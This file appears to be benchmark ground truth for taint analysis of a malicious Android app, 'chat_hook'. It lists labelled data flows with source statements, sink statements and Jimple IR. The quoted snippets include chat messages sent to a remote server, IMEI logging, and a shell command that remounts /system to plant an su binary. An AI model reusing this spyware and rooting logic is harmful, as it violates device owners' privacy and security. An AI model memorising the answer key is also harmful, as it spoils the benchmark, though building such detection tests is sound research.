@@ -1,0 +1,740 @@
+{
+  "fileName": "chat_hook.apk",
+  "day": "2019-04-11",
+  "findings": [
+    {
+      "source": {
+        "statement": "fis = context.openFileInput(\"mount\");",
+        "methodName": "public static String getMountDate(Context context)",
+        "className": "com.example.chathook.InjectUtils",
+        "lineNo": 109,
+        "targetName": "openFileInput",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r0.<android.content.Context: java.io.FileInputStream openFileInput(java.lang.String)>(\"mount\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "mOutputStream.writeBytes(cmd);",
+        "methodName": "public static boolean exeCMD(String cmd)",
+        "className": "com.example.chathook.InjectUtils",
+        "lineNo": 174,
+        "targetName": "writeBytes",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r2.<java.io.DataOutputStream: void writeBytes(java.lang.String)>($r0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "BufferedReader bufReader = new BufferedReader(new InputStreamReader(fis));",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 110,
+          "ID": 1
+        },
+        {
+          "statement": "String readLine = bufReader.readLine();",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 111,
+          "ID": 2
+        },
+        {
+          "statement": "readLine = bufReader.readLine();",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 112,
+          "ID": 3
+        },
+        {
+          "statement": "} while (!readLine.contains(\" /system \"));",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 113,
+          "ID": 4
+        },
+        {
+          "statement": "system = readLine.substring(0, readLine.indexOf(\" \"));",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 114,
+          "ID": 5
+        },
+        {
+          "statement": "return system;",
+          "methodName": "public static String getMountDate(Context context)",
+          "className": "com.example.chathook.InjectUtils",
+          "lineNo": 127,
+          "ID": 6
+        },
+        {
+          "statement": "String systemDev = InjectUtils.getMountDate(this);",
+          "methodName": "public void copySU(Context context)",
+          "className": "com.example.chathook.MainActivity",
+          "lineNo": 252,
+          "ID": 7
+        },
+        {
+          "statement": "InjectUtils.exeCMD(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(\"\" + \"mount -o remount,rw \" + systemDev + \" /system \\n\")).append(\"mount -o remount,rw /system \\n\").toString())).append(\"cat \").append(sufilepath).append(\" > /system/xbin/competing_su \\n\").toString());",
+          "methodName": "public void copySU(Context context)",
+          "className": "com.example.chathook.MainActivity",
+          "lineNo": 257,
+          "ID": 8
+        }
+      ],
+      "attributes": {
+        "pathConstraints": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads mount data to construct a command and execute it.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "new DefaultHttpClient().execute(request);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.example.chathook.HookReceiver.MsgTask",
+        "lineNo": 115,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r10.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new MsgTask().execute(new String[]{stringExtra});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 56,
+          "ID": 1
+        },
+        {
+          "statement": "builder.append(params[0]);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.example.chathook.HookReceiver.MsgTask",
+          "lineNo": 108,
+          "ID": 2
+        },
+        {
+          "statement": "request.setEntity(new ByteArrayEntity(builder.toString().getBytes(\"UTF8\")));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.example.chathook.HookReceiver.MsgTask",
+          "lineNo": 114,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious partial flow reads chat history and sends it to a remote server per an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String imei = ((TelephonyManager) getSystemService(\"phone\")).getDeviceId();",
+        "methodName": "public void getSN()",
+        "className": "com.example.chathook.InjectApplicaiton",
+        "lineNo": 128,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"ligan\", \"QQSN = \" + QQSN);",
+        "methodName": "public void getSN()",
+        "className": "com.example.chathook.InjectApplicaiton",
+        "lineNo": 144,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"ligan\", $r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "while (i < imei.length() && i < 14) {",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 135,
+          "ID": 1
+        },
+        {
+          "statement": "sn[i] = (char) (((imei.charAt(i) + i) % 26) + 65);",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 136,
+          "ID": 2
+        },
+        {
+          "statement": "QQSN = new String(sn);",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 139,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "pathConstraints": true,
+        "staticField": true
+      },
+      "ID": 3,
+      "description": "This malicious flow logs device id.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \" history chat: \\n\" + stringExtra);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 48,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (history) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 47,
+          "ID": 1
+        }
+      ],
+      "description": "This malicious flow logs chat history. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "pathConstraints": true,
+        "appendToString": true,
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 4
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \"lastmsgtime:\" + lastmsgtime);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 51,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r9)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (history) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 47,
+          "ID": 1
+        },
+        {
+          "statement": "ss = stringExtra.split(\"\\n\");",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 49,
+          "ID": 2
+        },
+        {
+          "statement": "String lastmsgtime = (String) lastmsg.get(ss[1]);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 50,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow logs last message time in chat history. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "array": true,
+        "pathConstraints": true,
+        "appendToString": true,
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 5
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \" current chat: \\n\" + stringExtra);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 62,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "This malicious flow logs chat history. ",
+      "isNegative": false,
+      "attributes": {
+        "appendToString": true,
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 6
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String imei = ((TelephonyManager) getSystemService(\"phone\")).getDeviceId();",
+        "methodName": "public void getSN()",
+        "className": "com.example.chathook.InjectApplicaiton",
+        "lineNo": 128,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"ligan\", \" send server chat: \\n\" + builder.toString());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.example.chathook.HookReceiver.MsgTask",
+        "lineNo": 110,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"ligan\", $r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "while (i < imei.length() && i < 14) {",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 135,
+          "ID": 1
+        },
+        {
+          "statement": "sn[i] = (char) (((imei.charAt(i) + i) % 26) + 65);",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 136,
+          "ID": 2
+        },
+        {
+          "statement": "QQSN = new String(sn);",
+          "methodName": "public void getSN()",
+          "className": "com.example.chathook.InjectApplicaiton",
+          "lineNo": 139,
+          "ID": 3
+        },
+        {
+          "statement": "new MsgTask().execute(new String[]{stringExtra});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 65,
+          "ID": 4
+        },
+        {
+          "statement": "builder.append(InjectApplicaiton.QQSN + \"\\n\");",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.example.chathook.HookReceiver.MsgTask",
+          "lineNo": 105,
+          "ID": 5
+        }
+      ],
+      "description": "This malicious flow logs imei. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "array": true,
+        "pathConstraints": true,
+        "threading": true,
+        "interComponentCommunication": true,
+        "staticField": true,
+        "appendToString": true
+      },
+      "ID": 7
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"ligan\", \" send server chat: \\n\" + builder.toString());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.example.chathook.HookReceiver.MsgTask",
+        "lineNo": 110,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"ligan\", $r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new MsgTask().execute(new String[]{stringExtra});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 65,
+          "ID": 1
+        },
+        {
+          "statement": "builder.append(params[0]);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.example.chathook.HookReceiver.MsgTask",
+          "lineNo": 108,
+          "ID": 2
+        }
+      ],
+      "description": "This malicious flow logs chat history. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "array": true,
+        "threading": true,
+        "interComponentCommunication": true,
+        "partialFlow": true
+      },
+      "ID": 8
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \"who uin :\" + ss[1] + \" nick:\" + ss[2]);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 52,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r9)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (history) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 47,
+          "ID": 1
+        },
+        {
+          "statement": "ss = stringExtra.split(\"\\n\");",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 49,
+          "ID": 2
+        }
+      ],
+      "description": "This malicious flow logs lat message time and with whom. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "array": true,
+        "pathConstraints": true,
+        "interComponentCommunication": true,
+        "appendToString": true,
+        "partialFlow": true
+      },
+      "ID": 9
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String imei = ((TelephonyManager) getSystemService(\"phone\")).getDeviceId();",
+        "methodName": "public void getSN()",
+        "className": "com.example.chathook.InjectApplicaiton",
+        "lineNo": 128,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \"imei = \" + imei);",
+        "methodName": "public void getSN()",
+        "className": "com.example.chathook.InjectApplicaiton",
+        "lineNo": 129,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "This malicious flow logs imei. ",
+      "isNegative": false,
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 10
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"ligan\", \"same msg \");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 72,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"ligan\", \"same msg \")"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (msg.equals(stringExtra)) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.example.chathook.HookReceiver",
+          "lineNo": 38,
+          "ID": 1
+        }
+      ],
+      "description": "This malicious flow is an implicit flow, since reaching sink depends on the data from source.  ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "pathConstraints": true,
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "implicitFlows": true
+      },
+      "ID": 11
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String newPkg = intent.getStringExtra(\"newPkg\");",
+        "methodName": "public void onReceive(final Context context, Intent intent)",
+        "className": "com.example.chathook.ProcessMonitor.AnonymousClass1",
+        "lineNo": 141,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"newPkg\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"yincc\", \"pkg---->\" + newPkg);",
+        "methodName": "public void onReceive(final Context context, Intent intent)",
+        "className": "com.example.chathook.ProcessMonitor.AnonymousClass1",
+        "lineNo": 144,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"yincc\", $r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (!TextUtils.isEmpty(newPkg)) {",
+          "methodName": "public void onReceive(final Context context, Intent intent)",
+          "className": "com.example.chathook.ProcessMonitor.AnonymousClass1",
+          "lineNo": 143,
+          "ID": 1
+        }
+      ],
+      "description": "This malicious flow logs package information ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true,
+        "interComponentCommunication": true,
+        "appendToString": true
+      },
+      "ID": 12
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "String stringExtra = intent.getStringExtra(\"chat\");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 36,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"chat\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"ligan\", \"new msg \");",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.example.chathook.HookReceiver",
+        "lineNo": 43,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"ligan\", \"new msg \")"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 13
+    }
+  ]
+}
